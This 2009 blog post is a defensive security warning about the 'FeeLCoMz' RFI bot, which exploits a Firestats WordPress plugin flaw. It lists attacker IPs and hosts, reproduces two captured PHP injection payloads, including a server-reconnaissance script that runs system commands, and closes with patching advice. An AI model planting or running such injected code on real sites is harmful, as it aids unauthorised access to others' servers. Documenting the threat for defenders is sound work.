---
title: New threat for all Joomla and WordPress installations
author: Alex
layout: post
permalink: /blog/2009/09/24/feelcomz-rfi/
categories:
  - Security
tags:
  - ajax
  - chat
  - class
  - control
  - handler
  - javascript
  - php
  - remote
  - upload
---
# 

There is a new BOT out there, and one of the bad ones. I have started receiving traffic from it in my servers over the past week, and after some investigation it turns out it is quite a powerful bot, and so simple to use even a kid with a computer could use it.

The bot attacks mainly Joomla and WordPress installations, the [Firestats plugin][1] for WordPress version 1.6.2 has [a known vulnerability][2] that is exploited by this bot.

 [1]: http://firestats.cc/wiki/Download
 [2]: http://www.milw0rm.com/exploits/8945

If successful, the bot will usually get your admin password and send it to a server somewhere, other versions f** your server up… it depends.

The bot is basically a top All-In-One product, that acts as a:

*   RFI Scanner
*   RFI Scan & Exploit
*   Joomla RFI Scan & Exploit
*   Milw0rm Search
*   Google bypass
*   Message Spy & Save
*   Auto Spreading

The last known spreader for the bot is the Fx29Spreadz v1.0 (Apr. 2009) which can be used from a server with a PHP Shell.

## IPs and servers:

This bot has used the following IPs and hosts (That I know of)

*   62.15.230.250
*   210.68.188.206
*   211.239.150.144
*   125.251.133.3
*   250.230.15.62.static.jazztel.es
*   buminch.org
*   www.framoss.ru

It has compromised servers in Republic of Korea, Taiwan and some other countries.

## Injections:

The bot basically tries to insert the following PHP line:

    <?php /* Fx29ID */ echo("FeeL"."CoMz"); die("FeeL"."CoMz"); /* Fx29ID */ ?>
    

Although there is another variation which inserts:

    <?php
        function ConvertBytes($number) {
        $len = strlen($number);
        if($len < 4) {
        return sprintf(”%d b”, $number); }
        if($len >= 4 &#038;&#038; $len < =6) {
        return sprintf(”%0.2f Kb”, $number/1024); }
        if($len >= 7 &#038;&#038; $len < =9) {
        return sprintf(”%0.2f Mb”, $number/1024/1024); }
        return sprintf(”%0.2f Gb”, $number/1024/1024/1024); }
    
        echo “Osirys  
    ”;
        $un = @php_uname();
        $id1 = system(id);
        $pwd1 = @getcwd();
        $free1= diskfreespace($pwd1);
        $free = ConvertBytes(diskfreespace($pwd1));
        if (!$free) {$free = 0;}
        $all1= disk_total_space($pwd1);
        $all = ConvertBytes(disk_total_space($pwd1));
        if (!$all) {$all = 0;}
        $used = ConvertBytes($all1-$free1);
        $os = @PHP_OS;
    
        echo “0sirys was here and also is a fucking gay..  
    ”;
        echo “uname -a: $un  
    ”;
        echo “os: $os  
    ”;
        echo “id: $id1  
    ”;
        echo “free: $free  
    ”;
        echo “used: $used  
    ”;
        echo “total: $all  
    ”;
        exit;
    

## Security recommendations:

If your website runs on WordPress, Joomla, Drupal, or other popular CMS you must upgrade all plugins and check for the latest version of the system!  
If you have Firestats I recommend deactivating it for some time, until a new version fixing that bug is released, and still, I would wait.  
If you have URL rewriting systems, ensure they are up-to-date, and if you built them re-check the security, and never include external files.

### Hope this helped you ![:)][3] 

 [3]: http://urbanoalvarez.es/blog/wp-includes/images/smilies/icon_smile.gif

If you found any variations and new stuff about this please comment below